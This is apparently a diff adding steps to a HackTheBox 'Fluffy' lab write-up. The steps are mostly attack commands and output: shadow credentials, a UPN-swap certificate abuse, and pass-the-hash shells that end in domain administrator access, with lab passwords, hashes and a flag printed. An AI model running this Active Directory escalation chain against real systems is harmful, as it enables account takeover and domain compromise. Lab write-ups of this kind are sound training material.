@@ -357,6 +357,152 @@ INFO: Done in 01M 15S
 INFO: Compressing output into 20250629085201_bloodhound.zip
 ```
 ```sh
-└─$ bloodyAD --host '10.129.232.88' -d 'dc01.fluffy.htb' -u 'p.agila' -p 'prometheusx-303'  add groupMember 'SERVICE ACCOUNTS' p.agila   
+└─$ bloodyAD --host '10.129.232.88' -d 'dc01.fluffy.htb' -u 'p.agila' -p 'prometheusx-303'  add groupMember 'SERVICE ACCOUNTS' p.agila
 [+] p.agila added to SERVICE ACCOUNTS
+                                                                                                                                                                                                                                            
+
+└─$ net rpc group members "SERVICE ACCOUNTS" -U "fluffy.htb"/"p.agila"%"prometheusx-303" -S 10.129.232.88                        
+FLUFFY\ca_svc
+FLUFFY\ldap_svc
+FLUFFY\p.agila
+FLUFFY\winrm_svc
+                                                                                                                                                                                                                                            
+
+└─$ sudo ntpdate 10.129.232.88                                                                                          
+2025-07-12 09:49:05.748159 (-0400) -0.002042 +/- 0.154301 10.129.232.88 s1 no-leap
+                                                                                                                                                                                                                                            
+
+└─$ certipy-ad shadow auto -u 'p.agila@dc01.fluffy.htb' -p 'prometheusx-303'  -account 'WINRM_SVC'  -dc-ip 10.129.232.88              
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[*] Targeting user 'winrm_svc'
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating Key Credential
+[*] Key Credential generated with DeviceID 'eca92afa-abd4-b376-89e2-b8763dd6f980'
+[*] Adding Key Credential with device ID 'eca92afa-abd4-b376-89e2-b8763dd6f980' to the Key Credentials for 'winrm_svc'
+[*] Successfully added Key Credential with device ID 'eca92afa-abd4-b376-89e2-b8763dd6f980' to the Key Credentials for 'winrm_svc'
+[*] Authenticating as 'winrm_svc' with the certificate
+[*] Certificate identities:
+[*]     No identities found in this certificate
+[*] Using principal: 'winrm_svc@fluffy.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'winrm_svc.ccache'
+[*] Wrote credential cache to 'winrm_svc.ccache'
+[*] Trying to retrieve NT hash for 'winrm_svc'
+[*] Restoring the old Key Credentials for 'winrm_svc'
+[*] Successfully restored the old Key Credentials for 'winrm_svc'
+[*] NT hash for 'winrm_svc': 33bd09dcd697600edf6b3a7af4875767
+```
+```sh
+└─$ evil-winrm -i 10.129.232.88 -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767       
+
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\winrm_svc\Documents> ls ../Desktop
+
+
+    Directory: C:\Users\winrm_svc\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        7/12/2025   6:08 AM             34 user.txt
+
+
+
+*Evil-WinRM* PS C:\Users\winrm_svc\Documents> cat ../Desktop/user.txt
+cc3b057ecf622b9459f1827353a4c23e
+```
+
+
+## STEP 5
+```sh
+└─$ certipy-ad account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.129.232.88'  -upn 'administrator' -user 'ca_svc' update
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[*] Updating user 'ca_svc':
+    userPrincipalName                   : administrator
+[*] Successfully updated 'ca_svc'
+
+
+└─$ certipy-ad shadow -u 'p.agila@dc01.fluffy.htb' -p 'prometheusx-303' -dc-ip '10.129.232.88' -account 'ca_svc' auto
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[*] Targeting user 'ca_svc'
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating Key Credential
+[*] Key Credential generated with DeviceID '802af9eb-b462-a8ff-1dac-b68f525a14ae'
+[*] Adding Key Credential with device ID '802af9eb-b462-a8ff-1dac-b68f525a14ae' to the Key Credentials for 'ca_svc'
+[*] Successfully added Key Credential with device ID '802af9eb-b462-a8ff-1dac-b68f525a14ae' to the Key Credentials for 'ca_svc'
+[*] Authenticating as 'ca_svc' with the certificate
+[*] Certificate identities:
+[*]     No identities found in this certificate
+[*] Using principal: 'ca_svc@fluffy.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'ca_svc.ccache'
+[*] Wrote credential cache to 'ca_svc.ccache'
+[*] Trying to retrieve NT hash for 'ca_svc'
+[*] Restoring the old Key Credentials for 'ca_svc'
+[*] Successfully restored the old Key Credentials for 'ca_svc'
+[*] NT hash for 'ca_svc': ca0f4f9e9eb8a092addf53bb03fc98c8
+
+
+└─$ export KRB5CCNAME=ca_svc.ccache
+
+
+└─$ certipy-ad req -k -dc-ip 10.129.232.88 -dc-host DC01 -target DC01.FLUFFY.HTB -ca fluffy-DC01-CA -template User
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Request ID is 20
+[*] Successfully requested certificate
+[*] Got certificate with UPN 'administrator'
+[*] Certificate has no object SID
+[*] Try using -sid to set the object SID or see the wiki for more details
+[*] Saving certificate and private key to 'administrator.pfx'
+[*] Wrote certificate and private key to 'administrator.pfx'
+
+
+└─$ certipy-ad account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.129.232.88' -upn 'ca_svc@fluffy.htb' -user 'ca_svc' update
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[*] Updating user 'ca_svc':
+    userPrincipalName                   : ca_svc@fluffy.htb
+[*] Successfully updated 'ca_svc'
+                                                                                                                                                                                                                                            
+
+└─$  certipy-ad auth -dc-ip '10.129.232.88' -pfx 'administrator.pfx' -username 'administrator' -domain 'fluffy.htb'
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: 'administrator'
+[*] Using principal: 'administrator@fluffy.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'administrator.ccache'
+[*] Wrote credential cache to 'administrator.ccache'
+[*] Trying to retrieve NT hash for 'administrator'
+[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
+```
+```
+└─$ evil-winrm -i 10.129.232.88 -u administrator -H '8da83a3fa618b6e3a00e93f676c92a6e'
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents>
 ```
